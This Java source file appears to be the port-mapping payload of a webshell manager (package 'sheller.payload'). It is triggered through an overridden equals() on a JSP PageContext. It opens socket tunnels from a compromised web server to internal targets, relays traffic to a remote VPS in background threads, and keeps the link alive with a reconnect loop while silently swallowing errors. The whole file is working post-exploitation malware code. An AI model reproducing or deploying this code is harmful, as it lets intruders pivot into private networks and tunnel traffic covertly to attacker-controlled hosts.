package vip.youwe.sheller.payload.java;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

public class PortMap implements Runnable {

    public static String action;
    public static String targetIP;
    public static String targetPort;
    public static String socketHash;
    public static String remoteIP;
    public static String remotePort;
    public static String extraData;

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = (HttpServletResponse) page.getResponse();
        this.Request = (HttpServletRequest) page.getRequest();

        try {
            portMap(page);
        } catch (Exception exception) {
        }
        return true;
    }

    private HttpServletRequest Request;
    private HttpServletResponse Response;
    private HttpSession Session;
    String localKey;
    String remoteKey;
    String type;
    HttpSession httpSession;

    public void portMap(PageContext page) throws Exception {
        String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
        if (action.equals("createLocal")) {

            try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                this.Session.setAttribute(localSessionKey, socketChannel);
                this.Response.setStatus(200);
            } catch (Exception e) {
                e.printStackTrace();
                ServletOutputStream so = null;
                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }
            }

        } else if (action.equals("read")) {

            SocketChannel socketChannel = (SocketChannel) this.Session.getAttribute(localSessionKey);
            try {
                ByteBuffer buf = ByteBuffer.allocate(512);
                socketChannel.configureBlocking(false);
                int bytesRead = socketChannel.read(buf);
                ServletOutputStream so = this.Response.getOutputStream();
                while (bytesRead > 0) {
                    so.write(buf.array(), 0, bytesRead);
                    so.flush();
                    buf.clear();
                    bytesRead = socketChannel.read(buf);
                }

                so.flush();
                so.close();
            } catch (Exception e) {
                e.printStackTrace();
                this.Response.setStatus(200);
                ServletOutputStream so = null;
                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                    socketChannel.socket().close();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }
            }
        } else if (action.equals("write")) {
            SocketChannel socketChannel = (SocketChannel) this.Session.getAttribute(localSessionKey);

            try {
                byte[] extraDataByte = (new BASE64Decoder()).decodeBuffer(extraData);
                ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
                buf.clear();
                buf.put(extraDataByte);
                buf.flip();
                while (buf.hasRemaining()) {
                    socketChannel.write(buf);
                }
            } catch (Exception e) {
                ServletOutputStream so = null;
                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                    socketChannel.socket().close();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }

            }

        } else if (action.equals("closeLocal")) {

            try {
                Enumeration attributeNames = this.Session.getAttributeNames();
                while (attributeNames.hasMoreElements()) {

                    String attrName = attributeNames.nextElement().toString();
                    if (attrName.startsWith("local_" + targetIP + "_" + targetPort)) {
                        SocketChannel socketChannel = (SocketChannel) this.Session.getAttribute(attrName);
                        socketChannel.close();
                        this.Session.removeAttribute(attrName);
                    }

                }
            } catch (IOException e) {
                e.printStackTrace();
            }

        } else if (action.equals("createRemote")) {

            List<Thread> workList = new ArrayList<Thread>();
            this.Session.setAttribute("remote_portmap_workers", workList);
            try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
                String vps = remoteIP;
                int vpsPort = Integer.parseInt(remotePort);
                SocketChannel localSocketChannel = SocketChannel.open();
                localSocketChannel.connect(new InetSocketAddress(target, port));
                String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                this.Session.setAttribute(localKey, localSocketChannel);

                SocketChannel remoteSocketChannel = SocketChannel.open();
                remoteSocketChannel.connect(new InetSocketAddress(vps, vpsPort));

                String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                this.Session.setAttribute(remoteKey, remoteSocketChannel);
                Thread reader = new Thread(new PortMap(localKey, remoteKey, "read", this.Session));
                Thread writer = new Thread(new PortMap(localKey, remoteKey, "write", this.Session));
                Thread keeper = new Thread(new PortMap(localKey, remoteKey, "keepAlive", this.Session));
                reader.start();
                writer.start();
                keeper.start();
                workList.add(reader);
                workList.add(writer);
                workList.add(keeper);
                this.Response.setStatus(200);
            } catch (Exception e) {

                e.printStackTrace();
                ServletOutputStream so = null;
                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }

            }

        } else if (action.equals("closeRemote")) {
            Enumeration attributeNames = this.Session.getAttributeNames();
            while (attributeNames.hasMoreElements()) {
                String attrName = attributeNames.nextElement().toString();
                if (attrName.startsWith("remote_") && attrName.endsWith(targetIP + "_" + targetPort)) {

                    SocketChannel socketChannel = (SocketChannel) this.Session.getAttribute(attrName);
                    try {
                        socketChannel.close();
                    } catch (Exception exception) {
                    }


                    this.Session.removeAttribute(attrName);
                }
            }
            List<Thread> workList = (List) this.Session.getAttribute("remote_portmap_workers");
            for (Thread worker : workList) {
                worker.interrupt();
            }
        }
    }


    public PortMap(String localKey, String remoteKey, String type, HttpSession session) {
        this.localKey = localKey;
        this.remoteKey = remoteKey;
        this.httpSession = session;
        this.type = type;
    }


    public PortMap() {
    }


    public void run() {
        if (this.type.equals("read")) {
            while (true) {
                try {
                    SocketChannel localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                    SocketChannel remoteSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.remoteKey);
                    ByteBuffer buf = ByteBuffer.allocate(512);
                    int bytesRead = localSocketChannel.read(buf);
                    OutputStream so = remoteSocketChannel.socket().getOutputStream();
                    while (bytesRead > 0) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = localSocketChannel.read(buf);
                    }
                    so.flush();
                    so.close();
                } catch (IOException e) {
                    try {
                        Thread.sleep(5000L);
                    } catch (Exception exception) {
                    }
                }
            }
        }

        if (this.type.equals("write")) {
            while (true) {
                try {
                    SocketChannel localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                    SocketChannel remoteSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.remoteKey);
                    ByteBuffer buf = ByteBuffer.allocate(512);
                    int bytesRead = remoteSocketChannel.read(buf);
                    OutputStream so = localSocketChannel.socket().getOutputStream();
                    while (bytesRead > 0) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = remoteSocketChannel.read(buf);
                    }
                    so.flush();
                    so.close();
                } catch (IOException e) {
                    try {
                        Thread.sleep(5000L);
                    } catch (Exception exception) {
                    }
                }
            }
        }

        if (this.type.equals("keepAlive")) {
            String target = targetIP;
            int port = Integer.parseInt(targetPort);
            String vps = remoteIP;
            int vpsPort = Integer.parseInt(remotePort);

            while (true) {
                SocketChannel localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                if (!localSocketChannel.isConnected()) {
                    try {
                        localSocketChannel = SocketChannel.open();
                        this.httpSession.setAttribute(this.localKey, localSocketChannel);
                        localSocketChannel.connect(new InetSocketAddress(target, port));

                        SocketChannel remoteSocketChannel = SocketChannel.open();
                        this.httpSession.setAttribute(this.remoteKey, remoteSocketChannel);
                        remoteSocketChannel.connect(new InetSocketAddress(vps, vpsPort));
                    } catch (IOException ioException) {
                        ioException.printStackTrace();
                    }
                }

                try {
                    Thread.sleep(5000L);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
